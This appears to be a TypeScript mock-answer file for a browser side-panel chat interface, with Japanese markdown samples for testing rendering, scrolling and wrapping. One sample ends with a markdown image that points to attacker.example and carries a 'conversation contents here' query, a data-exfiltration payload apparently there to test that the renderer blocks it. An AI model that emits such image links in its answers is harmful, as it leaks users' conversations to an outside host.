const mixed = `## このページの要点

**サイドパネル**は、ブラウザの窓の端に開く細い領域です。ページを開いたまま、別の道具を横に並べて使えます。

- 幅はユーザーがドラッグで変えられる。**狭いと 320px** ほどになる
- タブを切り替えても出たままにできる
- 拡張からは \`chrome.sidePanel.open()\` で開ける

### 開き方の例

\`\`\`ts
chrome.sidePanel.setPanelBehavior({ openPanelOnActionClick: true })
\`\`\`

| 項目 | Chrome | Brave |
|---|---|---|
| side panel の API | 114 以上 | 同じ |
| 左右の切り替え | 設定から | 設定から |

> 引用: サイドパネルは *補助の* 画面で、主役はページの方です。

詳しくは [Chrome の docs](https://developer.chrome.com/docs/extensions/reference/api/sidePanel) を見てください。

![パネルの図](https://attacker.example/pixel.png?q=ここに会話の中身)
`

const short = `はい。本文の **3 か所** に書かれています。English words が混ざった行と、とても長い URL https://ja.wikipedia.org/wiki/%E3%82%B5%E3%82%A4%E3%83%89%E3%83%91%E3%83%8D%E3%83%AB_%E9%95%B7%E3%81%84%E9%95%B7%E3%81%84%E9%95%B7%E3%81%84 の折り返しも見てください。`

const long = Array.from(
  { length: 14 },
  (_, i) =>
    `${i + 1}. **${i + 1} 段落目**: 長い回答が流れてくる間、スクロールが下端に張り付くかを見ます。途中で上へスクロールすると張り付きが外れ、下端の「最新へ」で戻れます。`,
).join('\n')

export const suggestions = [
  'このページを 3 行で要約して',
  '長い説明を書いて',
  '短く答えて',
]

export function answerFor(question: string, turn: number): string {
  if (question.includes('長')) return `## 長い回答\n\n${long}\n\n以上です。`
  if (question.includes('短')) return short
  return turn % 2 === 0 ? mixed : short
}
